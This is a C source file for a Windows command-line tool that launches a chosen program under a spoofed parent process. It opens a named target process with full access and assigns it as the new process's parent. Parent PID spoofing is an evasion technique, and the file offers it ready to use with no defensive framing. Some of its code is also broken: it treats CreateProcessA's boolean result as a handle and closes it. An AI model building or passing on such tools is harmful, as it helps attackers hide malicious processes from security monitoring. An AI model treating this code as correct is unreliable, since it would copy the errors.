#undef UNICODE

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>

//This code opens a new process with a spoofed parent ID
//Usage: spoofer.exe <Full path to file> <name of parent process>


HANDLE findProcessPID(char* process) {
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(hSnapshot, &entry);
	if (strcmp(entry.szExeFile, process) == 0) {
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
		}
	else {
		while (Process32Next(hSnapshot, &entry)) {
			if (strcmp(entry.szExeFile, process) == 0) {
				printf("Found parent process! PID: %d\n", entry.th32ProcessID);
				hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				return hProcess;
			}
		}

	}

	return hProcess;
}

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Usage: spoofer.exe <Full path to file> <Process name to spoof as parent>");
		return 1;
	}


	LPPROC_THREAD_ATTRIBUTE_LIST proclist = NULL;
	SIZE_T size = NULL;

	STARTUPINFOEXA startupex;
	PROCESS_INFORMATION processinfo;


	RtlSecureZeroMemory(&startupex, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&processinfo, sizeof(PROCESS_INFORMATION));

	startupex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	BOOL initproc = InitializeProcThreadAttributeList(NULL, 1, 0, &size);
	
	proclist = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);

	BOOL initprocs = InitializeProcThreadAttributeList(proclist, 1, 0, &size);
	if (!initprocs) {
		printf("Failed second time!");
	}
	

	HANDLE hProcess = findProcessPID(argv[2]);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("Parent process not found! Error ID: %d", GetLastError());
		return 1;
	}
	

	BOOL update = UpdateProcThreadAttribute(proclist, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);
	if (!update) {
		printf("Failed to update!");
	}
	
	startupex.lpAttributeList = proclist;

	HANDLE pHandle = CreateProcessA(NULL, argv[1], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &startupex.StartupInfo, &processinfo);
	if (pHandle == INVALID_HANDLE_VALUE) {
	
		printf("Error getting handle! Error: %d", GetLastError());
	}


	
	CloseHandle(pHandle);
	CloseHandle(hProcess);

	return 0;
}
